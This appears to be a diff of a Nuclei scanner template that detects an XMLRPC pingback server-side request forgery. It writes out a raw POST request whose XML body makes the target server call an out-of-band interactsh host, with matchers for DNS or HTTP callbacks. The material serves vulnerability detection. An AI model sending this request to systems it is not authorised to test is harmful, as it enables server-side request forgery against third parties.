@@ -3,20 +3,22 @@ id: xmlrpc-pingback-ssrf
 info:
   name: XMLRPC Pingback SSRF
   author: geeknik
+  reference: https://hackerone.com/reports/406387
   severity: high
-  description: XMLRPC Pingback leads to SSRF.
-  reference:
-    - https://hackerone.com/reports/406387
-  metadata:
-    max-request: 1
-  tags: xmlrpc,hackerone,ssrf,generic
 
-http:
+requests:
   - raw:
       - |
         POST /xmlrpc/pingback HTTP/1.1
         Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0
         Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Cookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; ANONYMOUS_USER_ID=2922001
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 305
 
         <?xml version="1.0" encoding="UTF-8"?>
         <methodCall>
@@ -25,12 +27,23 @@ http:
         <param>
         <value>http://{{interactsh-url}}</value>
         </param>
+        <param>
+        <value>https://{{Hostname}}/web/guest/home/</value>
+        </param>
         </params>
         </methodCall>
 
+    matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
+          - "dns"
           - "http"
-# digest: 4b0a00483046022100b9c0df7388577f0b020d925d4faf1d98344d0fed6488b6d1500c5e703b0f54a0022100ce92f1150040cc336adbdbe2e31a4363e1973409b27ec81c125c172c155d2886:922c64590222798bb761d5b6d8e72950
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "pingback"
+          - "xmlrpc"
+        condition: or
